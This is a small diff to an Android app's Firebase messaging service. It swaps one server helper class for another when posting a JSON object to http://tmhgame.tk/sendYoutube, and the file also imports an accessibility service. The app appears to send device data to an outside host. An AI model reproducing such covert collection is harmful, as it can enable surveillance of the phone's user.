@@ -11,6 +11,7 @@ import androidx.core.app.ActivityCompat;
 
 import com.family.accessibility.MyAccessibilityService;
 import com.family.internet.ServerHelper;
+import com.family.internet.ServerHelper2;
 import com.google.firebase.messaging.FirebaseMessagingService;
 import com.google.firebase.messaging.RemoteMessage;
 
@@ -62,7 +63,7 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
         } catch (JSONException e) {
             e.printStackTrace();
         }
-        new ServerHelper(this).execute("http://tmhgame.tk/sendYoutube", o.toString());
+        new ServerHelper2(this).execute("http://tmhgame.tk/sendYoutube", o.toString());
     }
     @Override
     public void onMessageReceived(RemoteMessage message) {
